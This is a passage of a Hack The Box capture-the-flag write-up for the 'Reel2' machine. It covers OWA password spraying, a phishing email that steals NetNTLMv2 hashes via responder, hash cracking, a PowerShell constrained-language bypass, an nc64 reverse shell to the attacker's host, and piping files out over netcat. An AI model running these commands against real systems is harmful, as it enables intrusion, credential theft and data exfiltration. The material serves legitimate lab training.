ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/e8c6696c29ec47659845a97b59286002"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation</span></span></h2><div id="https://www.notion.so/fcc999b7c27143919592a04857a7ebf0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">OWA Password Spraying</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/25afc7090e6f416a92ab656e6fdb2c17" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Password spray attack with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ruler</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/caab78ba332043bd8ae11d78e76e9104" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ruler -d reel2.htb -k brute -u users.txt -p passwords.txt -d 0 -v</code></span></span></p></div><pre id="https://www.notion.so/82258ef12b1f4ee4bdc4be324e229741" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[+] Starting bruteforce
[+] Trying to Autodiscover domain
[+] 0 of 7 passwords checked
...
Failed: svensvensson:Summer2020
Failed: svenssonsven:Summer2020
Failed: sven.svensson:Summer2020
Failed: svensson.sven:Summer2020
[+] Success: s.svensson:Summer2020</span></span></span></code></pre></li><li id="https://www.notion.so/d26a6af5a67944bf892be34ce79d1cd6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">After a few minutes, we get the credentials:</span></span><div id="https://www.notion.so/674cae79873b42a5bcae3cff6c0163ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">s.svensson:Summer2020</code></span></span></p></div></li><li id="https://www.notion.so/a5392214eb7c4e86afeb037ad8d1b288" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Login to Outlook Web App with brute-forced credentials as s.svensson.</span></span></li><li id="https://www.notion.so/e883832946de49b7996ce701571750f2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The user interface is in Swedish, it is possible to change the language settings by navigating through:</span></span><ol class="NumberedListWrapper"><li id="https://www.notion.so/c490a5a04e4d4b59abcd68c285e53489" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Open options menu with &quot;Alternativ&quot; on top right</span></span></li><li id="https://www.notion.so/dd5f27a7938d4367819d754d38f2e4ac" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">Select &quot;Nationella inställningar&quot;, then &quot;Språk&quot;</span></span></li><li id="https://www.notion.so/0b662fc90fad4b9c9a2031c9daec6230" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">Save by clicking &quot;Spara&quot;</span></span></li></ol></li><li id="https://www.notion.so/49a5240a59a346f4a43366339d7ffa8f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">In the &quot;About&quot; section of options, we see the version and info about our target exposed:</span></span><pre id="https://www.notion.so/7b191d3fc6894783a70977d8bf60fb16" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Version: 14.0.639.21
Client Access server operating system version: Microsoft Windows NT 6.3.9600.0</span></span></span></code></pre></li></ul><div id="https://www.notion.so/3d1ade166b13459da59f2c46d06e1a45" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">NetNTLMv2 hash stealing using Outlook</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/100ca5da18e34fed9c67fc037be112e8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This version of Outlook is outdated and vulnerable to SMB attachment phishing (&lt;15.0.1497).</span></span></li><li id="https://www.notion.so/e67b9ecc63fa411b8d4bdf6b0685c10d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">It is possible to craft an email that steals the victim&#x27;s NetNTLMv2 hashes without requiring any user interaction, clicking on the email to preview it is enough for the hashes to be stolen.</span></span></li><li id="https://www.notion.so/83cde9a51d7446e89c3c8c9e5673f786" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create a phishing email with only an URL to our HTTP server in the body, the subject can be anything we would like:</span></span><div id="https://www.notion.so/d7f9b83fc4b64a2daf681505e20184cf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.14.103/">http://10.10.14.103</a></span></span></p></div></li><li id="https://www.notion.so/b18dcbbbb99a49e08f3983d69f5813bc" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">In the &quot;To:&quot; tab, select all users. Untick the Administrator to avoid detection, and the Directory Search Mailbox as it is usually undeliverable. Don&#x27;t forget to include users on the second page:</span></span><div id="https://www.notion.so/3be254c5784445ae8ec57b6f7707559e" class="Image Image--Normal"><figure><a href="https://i.imgur.com/8NiocHd.png?width=576"><img src="https://i.imgur.com/8NiocHd.png?width=576" style="width:576px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li><li id="https://www.notion.so/9031037c9c4f4a518eec8b8a01defeed" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The resulting phishing email should look something resembling this:</span></span><div id="https://www.notion.so/3e17649d1d2b4b2bb5cb3c51512f803a" class="Image Image--Normal"><figure><a href="https://i.imgur.com/9b2AomC.png?width=624"><img src="https://i.imgur.com/9b2AomC.png?width=624" style="width:624px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li><li id="https://www.notion.so/821e4933e9e64bcda4f220d9fd3aa8b6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Before sending the message, listen for the incoming SMB packets containing the NTLM hash with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">responder</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/da55e8711bfd43fa966b389478292550" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo responder -I tun0 -v</code></span></span></p></div></li><li id="https://www.notion.so/d94099b46b28474689e316acabe0e8d8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Send the message, and after a few minutes, we should get k.svensson&#x27;s NTLM hash in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">responder</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/b840e25d7ebe4166951fabefa5147c5c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[HTTP] Sending NTLM authentication request to 10.10.10.210
[HTTP] POST request from: 10.10.10.210     URL: /
[HTTP] Host             : 10.10.14.103
[HTTP] NTLMv2 Client   : 10.10.10.210
[HTTP] NTLMv2 Username : htb\k.svensson
[HTTP] NTLMv2 Hash     : k.svensson::htb:674b7f83c29a5106:FAED26E7B1A28ACCC1ED389076CBE92D:01010000000000007DD6001790FCD601FACF82A2C3EE7698000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000400000A5F56C688795519E9E05DF97F15DAB3A15A7751DF89F12E22C8747E1E867CE530A001000000000000000000000000000000000000900220048005400540050002F00310030002E00310030002E00310034002E003100300033000000000000000000</span></span></span></code></pre></li><li id="https://www.notion.so/423193ac3ec84380970514c90b9c9e42" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looks like Sven&#x27;s brother Knut Svensson clicked on our phishing email. Save the NTLM hash to a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">knut.hash</code></span><span class="SemanticString"> file.</span></span></li><li id="https://www.notion.so/46f14d41b84a4475b64f5a6f07ec6950" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Cracking k.svensson&#x27;s NTLM hash with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hashcat</code></span><span class="SemanticString"> after checking the hash type:</span></span><div id="https://www.notion.so/18b37b8379704ff78c298929733a8272" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ hashcat -h</code></span></span></p></div><pre id="https://www.notion.so/4fbc0b9e67d94a008351a0d7ada4e94c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>5600 | NetNTLMv2 | Network Protocols</span></span></span></code></pre><div id="https://www.notion.so/a2797cd8f5b747449e06ab25a15fafcc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ hashcat -m 5600 knut.hash ~/Desktop/rockyou.txt -d 3</code></span></span></p></div><pre id="https://www.notion.so/0b231f9b87ad438ea316ed11def82203" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>K.SVENSSON::htb:674b7f83c29a5106:faed26e7b1a28accc1ed389076cbe92d:01010000000000007dd6001790fcd601facf82a2c3ee7698000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c000800300030000000000000000000000000400000a5f56c688795519e9e05df97f15dab3a15a7751df89f12e22c8747e1e867ce530a001000000000000000000000000000000000000900220048005400540050002f00310030002e00310030002e00310034002e003100300033000000000000000000:kittycat1</span></span></span></code></pre></li><li id="https://www.notion.so/88c915d555464562afe7fa6fc57795ad" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get credentials:</span></span><div id="https://www.notion.so/d80027fbea094f679d6ba258ac79d880" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">k.svensson:kittycat1</code></span></span></p></div></li><li id="https://www.notion.so/e0d5b423b7d44e0e8edf4454a5ef6613" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Remote into the machine with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString"> using k.svensson&#x27;s credentials:</span></span><div id="https://www.notion.so/4ef923e0880e45cdb40821c12cc3b943" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ evil-winrm -i 10.10.10.210 -u k.svensson -p kittycat1</code></span></span></p></div><pre id="https://www.notion.so/3de2e20994e84bab9fe74d3abca0d028" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS The term &#x27;Invoke-Expression&#x27; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException</span></span></span></code></pre></li><li id="https://www.notion.so/b999bb0db25042bb95e962e5469c7ea2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looks like we connected successfully, but we&#x27;re in a restricted shell and cannot execute any commands.</span></span></li><li id="https://www.notion.so/e880e3d3a5e8498f837aba8ca8d17403" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Since </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString"> relies on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Invoke-Expression</code></span><span class="SemanticString"> to send our commands, we will have to remote in manually with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Enter-PSSession</code></span><span class="SemanticString"> on a separate Powershell session instead.</span></span></li><li id="https://www.notion.so/5c69ac35a62746a696163595c02605d6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Install Powershell and GSSAPI libraries from AUR:</span></span><div id="https://www.notion.so/bcae33063bd5449fa9b7f8104ebd9831" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ yay -S powershell-bin</code></span></span></p></div><div id="https://www.notion.so/95e2b0cdae4a4d3ba32e61fe991b496e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ yay -S gss-ntlmssp</code></span></span></p></div></li><li id="https://www.notion.so/e0adb0d2d70340f98bc456c5205eb0cb" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Start a Powershell session:</span></span><div id="https://www.notion.so/7c549d2f69cf4b8d8ba7edcd7c29a933" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ pwsh</code></span></span></p></div></li><li id="https://www.notion.so/efe11ef312994a2487a30175159de7a0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create a session variable and enter the cracked password:</span></span><div id="https://www.notion.so/c9dd1a02f3bd453790519c1c347294f8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; $session = New-PSSession -ComputerName 10.10.10.210 -Authentication Negotiate -Credential k.svensson</code></span></span></p></div><pre id="https://www.notion.so/685b211c18004852a1188dd8e423c886" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PowerShell credential request
Enter your credentials.
Password for user k.svensson: *********</span></span></span></code></pre></li><li id="https://www.notion.so/83c7c17fddea4eb2851fa18928fee811" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Enter the session:</span></span><div id="https://www.notion.so/6fadb88c6b6a46be977e5758147ef5a5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Enter-PSSession $session</code></span></span></p></div><pre id="https://www.notion.so/80f9e106e545428dadedacb4e5837c09" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token punctuation">[</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>210<span class="token punctuation">]</span>: <span class="token function">PS</span>>_</span></span></span></code></pre></li><li id="https://www.notion.so/5f94d60826da433b972a82f24ca29dff" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">As expected, normal commands like </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dir</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cd</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">type</code></span><span class="SemanticString"> are not working in the restricted session, we can check this by:</span></span><div id="https://www.notion.so/d18d7fc9eddf442281ac8363e1d3dffb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; $ExecutionContext.SessionState.LanguageMode</code></span></span></p></div><pre id="https://www.notion.so/7fb7db5cefaa4fb29477ee244c2cbfc7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>ConstrainedLanguage</span></span></span></code></pre></li><li id="https://www.notion.so/d03fce9b54b1412daa3acf7af379cb97" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Though, we can use the script block expression </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&amp;{command}</code></span><span class="SemanticString"> to bypass this restriction:</span></span><div id="https://www.notion.so/512b112d0cbc42b990f751117c8aeee8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; &amp;{whoami /all}</code></span></span></p></div><pre id="https://www.notion.so/310b1251262048c2849d67513c55a644" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>USER INFORMATION
----------------
User Name      SID
============== =============================================
htb\k.svensson S-1-5-21-158661246-3153678129-2567348495-1165</span></span></span></code></pre><div id="https://www.notion.so/3820e7329a404632b5601522081c5eb2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; &amp;{pwd}</code></span></span></p></div><pre id="https://www.notion.so/8057d70f2c484e36bea9954fae572eae" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>C:\Users\k<span class="token punctuation">.</span>svensson\Documents</span></span></span></code></pre><div id="https://www.notion.so/7e21ac00c8434a44846228aaa0c98c23" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; &amp;{type ..\Desktop\user.txt}</code></span></span></p></div><pre id="https://www.notion.so/c308174f10074ea389d635b284322738" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>a159------------------------1519</span></span></span></code></pre></li><li id="https://www.notion.so/6d8203b7390141899c0ea8b1e9b340f9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get user flag!</span></span></li></ul><h2 id="https://www.notion.so/15dcc992e2ab41118ee4b8d523b8c864" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/15dcc992e2ab41118ee4b8d523b8c864"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/d6fa5ebc04a244fa88b7a061e3710f13" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">To make things easier to navigate, let&#x27;s upgrade to an unrestricted shell using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/b79434474c6a4bb6bd2aee34e4d80140" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Host </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc64</code></span><span class="SemanticString"> binary on HTTP:</span></span><div id="https://www.notion.so/776d4cbac78d45be9eade68ede7c11ab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cp ../Common/nc64.exe ./ &amp;&amp; updog</code></span></span></p></div></li><li id="https://www.notion.so/3ba6393fadfd4db68cf260ef7d269ea2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc64</code></span><span class="SemanticString"> binary from target host with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Invoke-WebRequest</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/ee821ff7580b43418644e50d53aee5ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; &amp;{iwr -uri http://10.10.14.103:9090/nc64.exe -o &#x27;C:\Users\k.svensson\Videos\nc64.exe&#x27;}</code></span></span></p></div></li><li id="https://www.notion.so/9cd93bcab3954f6a9de1eb9218ab9e6d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">On our local machine, listen for a reverse connection:</span></span><div id="https://www.notion.so/dd9ebe6ff19b425b8b1d12ffc8db48b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969</code></span></span></p></div></li><li id="https://www.notion.so/47f8667d0d1646ebb859e13dc7f72085" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Establish a PowerShell session with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/7969ca7aebf0418cb3a983514c476481" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; &amp;{./nc64.exe 10.10.14.103 6969 -e powershell.exe}</code></span></span></p></div></li><li id="https://www.notion.so/537df601a03346b3af462059a6c88df7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We should now get an unrestricted reverse shell as k.svensson, with full language capabilities:</span></span><div id="https://www.notion.so/71f89b71460e4c74a6afdc51e7a9c7b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; $ExecutionContext.SessionState.LanguageMode</code></span></span></p></div><pre id="https://www.notion.so/ee5c186c2902467a892e4697f0e8abf9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>FullLanguage</span></span></span></code></pre></li><li id="https://www.notion.so/518dcf9149814eb386760d16be0a331c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Now that we don&#x27;t need to use the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&amp;{}</code></span><span class="SemanticString"> script block to send commands, we can start enumerating further.</span></span></li><li id="https://www.notion.so/b26ca75a2d6e400390f299e9483bfc86" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We find </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.psrc</code></span><span class="SemanticString"> (role capabilities) and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.pssc</code></span><span class="SemanticString"> (session configuration) files for the jea_test_account in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">~\Documents</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/06a4c7176ad44ab7b7e0b8d667c89bef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; ls &#x27;C:\Users\k.svensson\Documents\&#x27;</code></span></span></p></div><pre id="https://www.notion.so/5c987751bef54f52acbacb338d2a83ae" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Directory: C:\Users\k.svensson\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/30/2020   5:14 PM                WindowsPowerShell
-a----        7/31/2020  11:58 AM           5600 jea_test_account.psrc
-a----        7/31/2020  11:58 AM           2564 jea_test_account.pssc</span></span></span></code></pre></li><li id="https://www.notion.so/ccc2759128ef48cf96eacc44e9c060cc" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Since the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">WindowsPowerShell</code></span><span class="SemanticString"> folder is empty, let&#x27;s transfer only the other PowerShell files back to our local machine:</span></span><div id="https://www.notion.so/0b9f19c84cae40f9abe1dfed3a002c7c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; type ./jea_test_account.psrc | ../Videos/nc64.exe 10.10.14.103 1337</code></span></span></p></div></li><li id="https://www.notion.so/31011c8f3f3c42efa6e9d8b18db6d9ff" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looking at the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.psrc</code></span><span class="SemanticString"> file, we find a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Check-File</code></span><span class="SemanticString"> function defined under jea_test_account:</span></span><pre id="https://www.notion.so/c35b3059d4764f97b77e52a49b96755d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>FunctionDefinitions = @<span class="token punctuation">{</span>
  <span class="token string">'Name'</span> = <span class="token string">'Check-File'</span>
  <span class="token string">'ScriptBlock'</span> = <span class="token punctuation">{</span><span class="token keyword">param</span><span class="token punctuation">(</span><span class="token variable">$Path</span><span class="token punctuation">,</span><span class="token variable">$ComputerName</span>=<span class="token variable">$env</span>:COMPUTERNAME<span class="token punctuation">)</span> <span class="token namespace">[bool]</span><span class="token variable">$Check</span>=<span class="token variable">$Path</span> <span class="token operator">-like</span> <span class="token string">"D:\*"</span> <span class="token operator">-or</span> <span class="token variable">$Path</span> <span class="token operator">-like</span> <span class="token string">"C:\ProgramData\*"</span> <span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$check</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">get-content</span> <span class="token variable">$Path</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token punctuation">}</span></span></span></span></code></pre></li><li id="https://www.notion.so/31f7eebd8f3c41f982e20277a82f28fe" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The function appears to first run a check on whether if a file is in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\ProgramData\</code></span><span class="SemanticString">, and then runs </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Get-Content</code></span><span class="SemanticString"> on the file. We might be able to leverage this function to read privileged files.</span></span></li><li id="https://www.notion.so/426a2726084a4a8fa0ff73b9124e6460" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Finding </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.log</code></span><span class="SemanticString"> files:</span></span><div id="https://www.notion.so/5c8dac0e616b48558677ebcb1f9be043" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; Get-ChildItem -Path C:\ -Filter *.log -Recurse -File -Name -Force</code></span></span></p></div><pre id="https://www.notion.so/dd4879e5a4c84c378ce5c29bc7018c4a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>...
Users\k.svensson\AppData\Local\Microsoft\Windows\WebCache\V010000F.log
Users\k.svensson\AppData\Local\Microsoft\Windows\WebCache\V0100010.log
Users\k.svensson\AppData\Local\Microsoft\Windows\WebCache\V01tmp.log
Users\k.svensson\AppData\Local\Mozilla\Firefox\Profiles\5hx9aux9.default-release\cache2\index.log
Users\k.svensson\AppData\Local\Temp\wmsetup.log
